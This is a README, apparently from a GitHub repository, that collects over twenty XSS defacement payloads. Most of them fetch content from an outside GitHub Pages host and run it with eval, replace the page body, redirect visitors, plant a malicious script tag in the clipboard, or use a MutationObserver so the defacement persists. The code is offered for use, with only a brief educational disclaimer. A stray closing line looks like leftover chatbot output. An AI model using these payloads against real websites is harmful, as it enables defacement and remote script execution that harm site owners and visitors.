
# XSS Deface Payloads

This repository contains various XSS (Cross-Site Scripting) deface payloads that can be used to load and execute external content. These payloads demonstrate different methods to achieve this, using various JavaScript techniques and libraries.

## Table of Contents

1. [Using jQuery to load and execute external content](#using-jquery-to-load-and-execute-external-content)
2. [Using vanilla JavaScript to load and execute external content](#using-vanilla-javascript-to-load-and-execute-external-content)
3. [Using XMLHttpRequest to load and execute external content](#using-xmlhttprequest-to-load-and-execute-external-content)
4. [Using async/await with Fetch API](#using-asyncawait-with-fetch-api)
5. [Using Axios to load and execute external content](#using-axios-to-load-and-execute-external-content)
6. [Using the `DOMParser` API to load and execute external content](#using-the-domparser-api-to-load-and-execute-external-content)
7. [Using `innerHTML` with a `div` element to load and execute external content](#using-innerhtml-with-a-div-element-to-load-and-execute-external-content)
8. [Using `insertAdjacentHTML` to load and execute external content](#using-insertadjacenthtml-to-load-and-execute-external-content)
9. [Using `document.write` to load and execute external content](#using-documentwrite-to-load-and-execute-external-content)
10. [Using `iframe` to load and execute external content](#using-iframe-to-load-and-execute-external-content)
11. [Using `innerHTML` with `template` element to load and execute external content](#using-innerhtml-with-template-element-to-load-and-execute-external-content)
12. [Using `outerHTML` to load and execute external content](#using-outerhtml-to-load-and-execute-external-content)
13. [Using `innerHTML` with `shadowRoot` to load and execute external content](#using-innerhtml-with-shadowroot-to-load-and-execute-external-content)



### Using `eval` with Fetch API

```html
<script>
fetch('https://karthikdude.github.io/Deface/script.js')
    .then(response => response.text())
    .then(script => {
        eval(script);
    });
</script>
```

**Details:** This payload fetches an external JavaScript file and executes it directly using `eval`. While this is a less secure approach, it is effective in environments where execution of external scripts is needed.

---

### Using `setTimeout` for Delayed Execution

```html
<script>
setTimeout(() => {
    fetch('https://karthikdude.github.io/Deface/')
        .then(response => response.text())
        .then(html => {
            document.body.innerHTML = html;
            const scripts = document.body.getElementsByTagName('script');
            for (let script of scripts) {
                eval(script.innerText);
            }
        });
}, 5000);
</script>
```

**Details:** This payload delays the execution of the defacement script by 5 seconds. This can be useful in scenarios where a delay is needed to bypass certain protections or load conditions.

---

### Using `window.location` for Redirection

```html
<script>
window.location = 'https://karthikdude.github.io/Deface/';
</script>
```

**Details:** This payload redirects the user to an external page. This is a simple but effective defacement method that changes the displayed content entirely.

---

### Using `srcdoc` Attribute in an Iframe

```html
<iframe srcdoc="<h1>Hacked!</h1><script>alert('Defaced!')</script>" style="border: none; width: 100%; height: 100%;"></iframe>
```

**Details:** This payload uses the `srcdoc` attribute of an iframe to inject custom HTML and JavaScript. It is a self-contained defacement payload that does not depend on external resources.

---

### Using `fetch` with Dynamic Script Injection

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const script = document.createElement('script');
        script.innerHTML = html;
        document.body.appendChild(script);
    });
</script>
```

**Details:** This payload dynamically creates a script element, injects the fetched content into it, and appends it to the document body.

---

### Using `MutationObserver` for Persistent Defacement

```html
<script>
const observer = new MutationObserver(() => {
    fetch('https://karthikdude.github.io/Deface/')
        .then(response => response.text())
        .then(html => {
            document.body.innerHTML = html;
        });
});
observer.observe(document.body, { childList: true });
</script>
```

**Details:** This payload uses a `MutationObserver` to monitor changes to the `body` element. If the body changes, it reloads the defacement content, ensuring persistence.

---

### Using `navigator.clipboard` to Inject Content

```html
<script>
navigator.clipboard.writeText('<script src="https://karthikdude.github.io/Deface/script.js"></script>');
alert('Clipboard content updated!');
</script>
```

**Details:** This payload writes a malicious script to the clipboard. While it doesn’t directly deface the site, it can trick users into pasting harmful content.

---

### Using `document.createElement` with Image Injection

```html
<script>
const img = document.createElement('img');
img.src = 'https://karthikdude.github.io/Deface/image.jpg';
img.style = 'width: 100%; height: auto;';
document.body.innerHTML = '';
document.body.appendChild(img);
</script>
```

**Details:** This payload replaces the entire content of the page with an image from an external source. It is a visual defacement technique.

---

### Using `onerror` Attribute for Script Execution

```html
<img src="invalid.jpg" onerror="fetch('https://karthikdude.github.io/Deface/').then(res => res.text()).then(eval)">
```

**Details:** This payload uses the `onerror` attribute of an image element to execute a script when the image fails to load.



## Using jQuery to load and execute external content

```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$.get('https://karthikdude.github.io/Deface/', function(data) {
    $('body').html(data);
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
});
</script>
```

**Details:** This payload uses jQuery to perform an AJAX request to fetch the external content and then replaces the entire body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using vanilla JavaScript to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.innerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using XMLHttpRequest to load and execute external content

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://karthikdude.github.io/Deface/', true);
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
        document.body.innerHTML = xhr.responseText;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    }
};
xhr.send();
</script>
```

**Details:** This payload uses the XMLHttpRequest object to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using async/await with Fetch API

```html
<script>
async function deface() {
    const response = await fetch('https://karthikdude.github.io/Deface/');
    const html = await response.text();
    document.body.innerHTML = html;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
}
deface();
</script>
```

**Details:** This payload uses async/await syntax with the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using Axios to load and execute external content

```html
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
axios.get('https://karthikdude.github.io/Deface/')
    .then(response => {
        document.body.innerHTML = response.data;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Axios library to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using the `DOMParser` API to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        document.body.innerHTML = doc.body.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the DOMParser API to parse the fetched HTML content and then replaces the body of the document with the parsed content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with a `div` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const div = document.createElement('div');
        div.innerHTML = html;
        document.body.innerHTML = div.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `div`'s content. It also evaluates any script tags within the fetched content.

## Using `insertAdjacentHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.insertAdjacentHTML('afterbegin', html);
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the `insertAdjacentHTML` method to insert the fetched content at the beginning of the body. It also evaluates any script tags within the fetched content.

## Using `document.write` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.open();
        document.write(html);
        document.close();
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses `document.write` to replace the entire document with the fetched content. It also evaluates any script tags within the fetched content.

## Using `iframe` to load and execute external content

```html
<script>
const iframe = document.createElement('iframe');
iframe.src = 'https://karthikdude.github.io/Deface/';
iframe.style.display = 'none';
document.body.appendChild(iframe);
iframe.onload = function() {
    document.body.innerHTML = iframe.contentDocument.body.innerHTML;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
};
</script>
```

**Details:** This payload creates an `iframe` element, sets its `src` to the external content URL, and then replaces the body of the document with the content of the `iframe`. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `template` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const template = document.createElement('template');
        template.innerHTML = html;
        document.body.innerHTML = template.content.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `template` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `template`'s content. It also evaluates any script tags within the fetched content.

## Using `outerHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.outerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload replaces the entire `outerHTML` of the body with the fetched content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `shadowRoot` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const shadowHost = document.createElement('div');
        const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
        shadowRoot.innerHTML = html;
        document.body.innerHTML = shadowRoot.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element with a `shadowRoot`, sets the `innerHTML` of the `shadowRoot` to the fetched content, and then replaces the body of the document with the `shadowRoot`'s content. It also evaluates any script tags within the fetched content.

## Disclaimer

These payloads are for educational purposes only. Always ensure you have proper authorization and are acting ethically when testing or using such payloads. Unauthorized use of these payloads can be illegal and unethical.
```

This `README.md` file includes all the provided payloads along with the newly generated ones, each with detailed explanations.
